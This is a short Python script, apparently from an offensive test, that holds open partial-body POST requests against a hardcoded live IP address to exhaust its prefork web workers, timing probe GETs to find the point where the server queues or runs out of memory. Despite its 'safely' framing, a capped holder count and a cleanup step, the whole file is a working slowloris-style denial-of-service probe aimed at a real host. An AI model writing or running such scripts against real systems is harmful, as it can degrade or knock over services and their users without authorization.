#!/usr/bin/env python3
"""measure_workers.py — SAFELY estimate the live target's effective prefork worker count.
Opens partial-body 'holder' POSTs in small batches; after each batch sends a timed probe GET.
Queuing onset (probe latency jump) or an OOM/RST tells us the ceiling. Closes holders promptly."""
import socket, time

HOST = "35.173.245.63"
holders = []

def open_holder():
    s = socket.create_connection((HOST, 80), timeout=8)
    s.sendall(b"POST /index.php HTTP/1.1\r\nHost: %s\r\n" % HOST.encode() +
              b"Content-Type: application/x-www-form-urlencoded\r\n"
              b"Content-Length: 1048576\r\nConnection: close\r\n\r\nx")
    return s

def probe():
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, 80), timeout=20)
        s.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % HOST.encode())
        d = b""
        while True:
            c = s.recv(65536)
            if not c: break
            d += c
            if len(d) > 400: break
        dt = time.time() - t0
        s.close()
        return dt, len(d), None
    except Exception as e:
        return (time.time() - t0), 0, repr(e)

# baseline
bl, _, err = probe()
print(f"baseline GET latency={bl:.2f}s ({err or 'ok'})")

MAXH = 34          # safety cap on holders to limit fork/memory pressure
BATCH = 5
try:
    for h in range(0, MAXH + 1, BATCH):
        for _ in range(BATCH):
            if len(holders) >= MAXH: break
            try:
                holders.append(open_holder())
            except Exception as e:
                print(f"  holder open failed at {len(holders)}: {e!r}")
        time.sleep(0.6)   # let children settle / fork
        dt, n, err = probe()
        status = "QUEUING/OOM?" if (err or dt > max(1.5 * bl, 2.0)) else "served"
        print(f"holders={len(holders):3d}  probe latency={dt:6.2f}s bytes={n:6d} {status}")
        if err or dt > max(2.5 * bl, 3.0):
            print(">>> queuing/OOM onset detected; effective worker count ~", len(holders))
            break
finally:
    for s in holders:
        try: s.close()
        except Exception: pass
    time.sleep(1.0)
    dt, n, err = probe()
    print(f"after closing all holders: probe latency={dt:.2f}s ({err or 'ok'})  <- recovery check")
